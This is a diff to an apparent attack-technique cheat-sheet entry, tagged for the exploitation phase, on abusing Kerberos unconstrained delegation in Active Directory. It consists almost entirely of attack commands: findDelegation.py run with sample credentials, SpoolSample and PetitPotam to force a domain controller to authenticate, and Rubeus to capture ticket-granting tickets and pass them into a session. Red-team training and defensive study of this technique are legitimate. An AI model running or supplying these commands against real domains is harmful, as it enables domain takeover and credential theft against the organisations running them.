@@ -4,36 +4,15 @@ description: |
 commands:
   - have: Credentials
     cmd: |
-      # Find unconstrained delegation computers (Impacket)
+      # Find unconstrained delegation computers
       findDelegation.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27
 
-      # Find unconstrained delegation computers (PowerShell AD module)
-      Get-ADComputer -Filter {TrustedForDelegation -eq $true}
-
-      # Find unconstrained delegation computers (PowerView)
-      Get-DomainComputer -Unconstrained
-
-      # Trigger authentication to unconstrained host (coerce DC via Print Spooler)
+      # Coerce DC to authenticate to unconstrained host
       SpoolSample.exe DC01 UNCONSTRAINED_HOST
+      # or: PetitPotam.py UNCONSTRAINED_HOST DC01
 
-      # Trigger authentication to unconstrained host (coerce DC via PetitPotam)
-      PetitPotam.py UNCONSTRAINED_HOST DC01
-
-      # Monitor for incoming TGTs on the unconstrained host
+      # Monitor for incoming TGTs and use captured ticket
       Rubeus.exe monitor /interval:5 /nowrap
-
-      # Use captured TGT — pass the ticket into current session
-      Rubeus.exe ptt /ticket:base64_ticket
-  - have: Shell
-    cmd: |
-      # From compromised unconstrained delegation host
-      # Monitor for incoming TGTs
-      Rubeus.exe monitor /interval:5 /nowrap
-
-      # Coerce DC to authenticate to this host
-      SpoolSample.exe DC01 UNCONSTRAINED_HOST
-
-      # Use captured TGT
       Rubeus.exe ptt /ticket:base64_ticket
 phase:
   - Exploitation
